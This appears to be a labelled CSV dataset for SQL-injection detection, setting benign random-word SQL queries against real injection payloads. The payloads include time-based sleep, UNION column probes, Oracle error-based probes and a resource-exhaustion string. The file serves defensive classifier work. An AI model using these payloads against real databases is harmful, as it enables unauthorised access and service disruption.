Query,Label
SELECT those FROM rear,0
"  SELECT Orders.layersrID, Employees.when, Employees.struggle FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID  =  Employees.whenID ORDER BY Orders.woolID",0
"  SELECT feelID AS ID, sick AS flag FROM possible",0
SELECT * FROM worse WHERE herself = 'although'  AND City = 'farm',0
"1   )    )     )   and elt  (  3114  =  3114,sleep  (  5   )    )   #",1
sojuela,0
"-5798"" or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  ",1
"1%""   )    )     )   union all select null,null,null,null,null,null,null,null,null,null--",1
"1%""  )   and 8626  =  3626#",1
"1  )   as iovi where 3910  =  3910 or 5356  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1
lu,0
-1629'   )    )     )   or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and    (    (     (  'tezf'  =  'tezf,1
"INSERT INTO belong ( route, collect, desert, bowl, smooth, threw )  VALUES  ( 'spread', 'weigh'. forty', 'fear', 'loss', 'apartment', 'studied' )  ",0
"1'+  (  select tnch where 1867  =  1867 or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null   )    )   +'",1
SELECT drop,0
 UPDATE settle SET feathers = 'motor'WHERE breathing = 'spent',0
